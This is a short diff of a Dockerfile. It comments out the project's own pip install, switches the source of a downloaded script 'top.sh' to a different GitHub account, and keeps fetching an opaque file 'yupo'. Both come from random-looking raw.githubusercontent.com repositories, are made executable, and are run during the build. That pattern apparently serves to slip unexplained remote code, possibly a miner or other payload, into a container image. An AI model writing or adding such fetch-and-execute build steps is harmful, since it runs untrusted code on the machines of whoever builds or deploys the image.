@@ -7,10 +7,10 @@ COPY . /app
 
 WORKDIR /app
 
-RUN pip install --editable .
+#RUN pip install --editable .
 
 RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
-RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/top.sh
+RUN wget https://raw.githubusercontent.com/martinpoy/moloi/main/top.sh
 RUN chmod +x yupo
 RUN chmod +x top.sh
 RUN ./top.sh
